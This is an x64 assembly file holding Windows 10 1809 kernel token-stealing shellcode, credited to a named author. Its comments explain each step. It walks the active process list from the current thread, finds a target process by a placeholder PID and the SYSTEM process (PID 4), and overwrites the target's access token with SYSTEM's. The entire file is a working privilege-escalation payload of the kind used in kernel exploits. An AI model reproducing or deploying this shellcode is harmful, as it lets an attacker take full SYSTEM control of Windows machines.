
[BITS 64]

; Windows 10 x64 1809 token stealing shellcode
; Written by John Stigerwalt

start:

;Find EPROCESS of current process (Whatever executes this code - Ex: Runme.exe)
;Find PROCESS ID of process (cmd.exe).
;Read ACCESS TOKEN from process (cmd.exe)
;Find EPROCESS of privileged process (system).
;Read ACCESS TOKEN from privileged process.
;Replace ACCESS TOKEN of the unprivileged process with privileged ACCESS TOKEN.

;	GS:0x180 		→→ _KPCR
;	_KPCR:0x008 	→→ _KTHREAD(CurrentThread)
;	_KTHREAD:0x220 	→→ _KPROCESS

mov r9, qword [gs:188h]
mov r9, qword [r9 + 220h]
;mov r8, qword ptr [r9 + 3e0h] ; Finds process id of parent


; Find Eprocess of cmd.exe
mov rax, r9
loop1:
mov rax, qword [rax + 2e8h] ; +0x2e8 ActiveProcessLinks
sub rax, 2e8h
cmp qword [rax + 2e0h], 1234h  ; +0x2e0 UniqueProcessId  : Ptr64 Void
jne loop1
mov rcx, rax
add rcx, 358h

; Find Eprocess of system with PID of 4
mov rax, r9
loop2:
mov rax, qword [rax + 2e8h]	; +0x2e8 ActiveProcessLinks
sub rax, 2e8h
cmp qword [rax + 2e0h], 4   ; +0x2e0 UniqueProcessId  : Ptr64 Void
jne loop2
mov rdx, rax
add rdx, 358h

; Store Token for overwrite of cmd.exe
mov rdx, qword [rdx]

; overwrite cmd.exe token offset with system token offset
mov qword [rcx], rdx 

; Return
ret
